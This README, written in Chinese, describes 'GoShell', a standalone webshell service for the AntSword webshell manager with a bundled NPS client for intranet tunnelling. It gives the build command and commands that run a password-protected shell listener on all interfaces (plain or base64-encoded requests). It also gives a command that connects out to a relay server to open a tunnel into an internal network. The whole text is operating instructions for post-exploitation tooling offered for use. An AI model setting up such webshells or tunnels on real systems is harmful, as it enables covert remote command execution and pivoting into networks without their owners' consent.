# GoShell
支持AntSword **CMDLINUX**类型的独立Web服务

GoShell内置了**NPS**客户端，配合NPS可达到内网穿透功能

# 编译
```shell script
cd cmd/GoShell
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -trimpath GoShell.go
```

# 运行
## 明文请求
```shell script
goshell -m shell -shell-addr 0.0.0.0:9010 -shell-pwd ant
```

## base64请求
```shell script
goshell -m shell -shell-addr 0.0.0.0:9010 -shell-pwd ant -shell-decoder base64
```

# 运行NPC
```shell script
goshell -m npc -server=1.1.1.1:8024 -vkey=key -type=tcp
```

